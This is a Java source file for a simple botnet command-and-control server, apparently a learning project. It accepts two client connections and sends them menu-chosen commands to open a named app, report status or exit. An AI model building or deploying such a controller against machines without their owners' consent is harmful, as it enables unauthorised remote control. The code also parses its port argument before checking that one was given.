import java.net.*;
import java.io.*;
import java.util.ArrayList;
import java.util.List;

/**
 * BotnetMutliServer Class:
 * User facing object used to create and send command objects to server thread
 */
public class BotnetMultiServer {
    //Class properties
    private CommandQueue centralQueue = new CommandQueue();
    private final String MENU = "\n------\nEnter a Command name \n1)open app\n2)status\n3)exit\n------";
    private List<BotnetServerThread> serverThreads = new ArrayList<>();

    public static void main(String[] args) throws IOException {
        //Properties
        int portNumber = Integer.parseInt(args[0]);
        BotnetMultiServer multiServer = new BotnetMultiServer();
        BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in));
        Command firstCommand = null;
        final int EXPECTEDCLIENTS = 2;
        int connectedClients = 0;

        //Making sure that class is init with port
        if (args.length != 1) {
            System.err.println("Usage: java BotnetMultiServer.java <PORT NUMBER>");
            System.exit(1);
        }

        //try to bind the socket for connections
        try (ServerSocket serverSocket = new ServerSocket(portNumber)) {
            System.out.println("[+]BotnetMultiServer is running");
            
            //connecting clients to the server and keeping track of their status
            while (connectedClients != EXPECTEDCLIENTS) {
                System.out.println("[*]Waiting for clients " + connectedClients + "/" + EXPECTEDCLIENTS + " connected");
                //Create new thread when client connects
                Socket clientSocket = serverSocket.accept();
                BotnetServerThread serverThread = new BotnetServerThread(clientSocket);
                //add thread to list in order to keep track of them
                multiServer.serverThreads.add(serverThread);
                System.out.println("[+]Client connected");
                // Start the server thread
                serverThread.start(); 
                //increase the count by 1
                connectedClients++;
            }

            System.out.println("[+] All clients connected");

            //Add the command of the users input to the queue
            System.out.println(multiServer.MENU);
            System.out.print("> ");
            String commandName = stdIn.readLine();
            Command command = multiServer.create_command(commandName, EXPECTEDCLIENTS);
            multiServer.centralQueue.put(command);
                         
            //iterate through all the threads connected
            for (BotnetServerThread thread : multiServer.serverThreads) {
                //update the thread so that their command queue is up to date with the multiservers
                thread.updateQueue(multiServer.centralQueue);
                //process the queue on the thread
                thread.processQueue();

                //get the queue back from the thread once it is done
                CommandQueue currentQueue = thread.returnQueue();
                //look at the first command
                firstCommand = currentQueue.peek();
                
                //if the thread returned the queue back successfully then update the central queue since the thread updated it
                if (currentQueue != null) {
                    multiServer.centralQueue = currentQueue;
                }
                //print the results
                System.out.println("[+]Client " + thread.getName() + ": " + firstCommand.getResponse());

            }
        } catch (IOException e) {
            System.err.println("[-] Could not listen on port: " + portNumber);
            System.exit(-1);
        }
    }

    /**
     * create_command: creates a command object with instructions according to name and time to live
     * @param commandName: the name of the command - will be translated to proper name for protocol
     * @param timeToLive: the amount of clients that need to run this command before it is removed from the queue
     * @return: new command object
     */
    private Command create_command(String commandName, int timeToLive) {
        //create input stream for text
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(System.in));
        //create empty command
        Command command = new Command(commandName);
        //set max life
        command.setMaxLife(timeToLive);
        
        //depending on command name
        //set its name to be proper and update instructions
        switch (command.getCommandName()) {
            case "1":
                command.setCommand("openApp");
                try {
                    System.out.print("[>]App Name: ");
                    String appName = bufferedReader.readLine();
                    command.setInstructions(appName);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                break;
            case "2":
                command.setCommand("status");
                command.setInstructions("show the status of the client");
                break;
            case "3":
                command.setCommand("exit");
                break;
            default:
                System.out.println("[-]Invalid Input");
                break;
        }
        return command;
    }
}
